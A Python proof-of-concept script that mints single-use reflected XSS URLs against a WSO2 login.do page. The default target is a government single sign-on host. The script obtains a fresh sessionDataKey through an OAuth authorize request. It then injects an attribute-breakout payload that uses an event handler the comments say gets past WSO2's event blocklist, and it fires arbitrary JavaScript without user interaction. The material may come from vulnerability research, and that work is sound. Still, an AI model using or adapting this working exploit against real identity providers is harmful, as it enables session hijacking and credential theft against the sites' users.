#!/usr/bin/env python3
"""
poc_gen.py — mint a FRESH single-use WSO2 login.do XSS PoC URL.

sessionDataKey is single-use: every browser load consumes it. Run this script
each time you need a live PoC link (retest, screenshot, victim simulation).

Usage:
    python3 poc_gen.py                          # default PWNED-title payload
    python3 poc_gen.py '<payload-js>'           # custom event value
    python3 poc_gen.py --host sso.example.gov   # different IdP host

Requires: requests (pip install requests)
"""
import argparse
import base64
import hashlib
import re
import secrets
import sys
from urllib.parse import quote

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_HOST = "sso.dongnai.gov.vn"
DEFAULT_CLIENT_ID = "CONSOLE"
DEFAULT_REDIRECT = "https://{host}/console"

# Default payload: auto-fire, zero interaction, visible proof.
#   content-visibility:auto + off-screen -> oncontentvisibilityautostatechange
#   fires during initial layout; event is not in WSO2's on*-event blocklist.
DEFAULT_PAYLOAD = "document.title='PWNED';document.bgColor='red'"

# Attribute-breakout wrapper for the authenticators param.
# `">` closes the rendered button attribute; &#58; = ':' for style parsing.
WRAPPER = (
    'BasicAuthenticator:LOCAL;"> '
    '<p id=canary style=content-visibility&#58auto '
    "oncontentvisibilityautostatechange={payload}>dngxsscanary</p>"
    ":LOCAL"
)


def mint_url(host: str, payload_js: str, client_id: str, redirect: str) -> str:
    s = requests.Session()
    s.verify = False

    # PKCE S256 (mandatory for CONSOLE-style clients)
    verifier = secrets.token_urlsafe(48)
    challenge = (
        base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest())
        .rstrip(b"=")
        .decode()
    )

    authz = (
        f"https://{host}/oauth2/authorize"
        f"?response_type=code&client_id={client_id}"
        f"&scope=openid&redirect_uri={redirect}"
        f"&code_challenge={challenge}&code_challenge_method=S256"
    )
    r = s.get(authz, allow_redirects=False, timeout=20)
    loc = r.headers.get("Location", "")
    m = re.search(r"sessionDataKey=([a-f0-9-]{36})", loc)
    if not m:
        # some hosts route through /t/<tenant>/ first — follow once
        target = loc if loc.startswith("http") else f"https://{host}{loc}"
        r2 = s.get(target, allow_redirects=False, timeout=20)
        loc = r2.headers.get("Location", loc)
        m = re.search(r"sessionDataKey=([a-f0-9-]{36})", loc)
    if not m:
        sys.exit(f"[!] no sessionDataKey in authorize redirect: {loc[:200]}")
    sdk = m.group(1)

    # preload the login.do page so the session key is bound to a session
    login_base = loc.split("&sessionDataKey=")[0]
    preload = login_base if login_base.startswith("http") else f"https://{host}{login_base}"
    s.get(f"{preload}&sessionDataKey={sdk}", timeout=20)

    auth_value = WRAPPER.format(payload=payload_js)
    quoted = quote(auth_value, safe="")
    return (
        f"https://{host}/authenticationendpoint/login.do"
        f"?sessionDataKey={sdk}&client_id={client_id}"
        f"&authenticators={quoted}"
    )


def main():
    ap = argparse.ArgumentParser(description="Mint a fresh WSO2 login.do XSS PoC URL")
    ap.add_argument("payload", nargs="?", default=DEFAULT_PAYLOAD,
                    help="JS expression for the event value (single expression)")
    ap.add_argument("--host", default=DEFAULT_HOST)
    ap.add_argument("--client-id", default=DEFAULT_CLIENT_ID)
    ap.add_argument("--redirect", default=None)
    args = ap.parse_args()
    redirect = args.redirect or DEFAULT_REDIRECT.format(host=args.host)

    print(mint_url(args.host, args.payload, args.client_id, redirect))


if __name__ == "__main__":
    main()
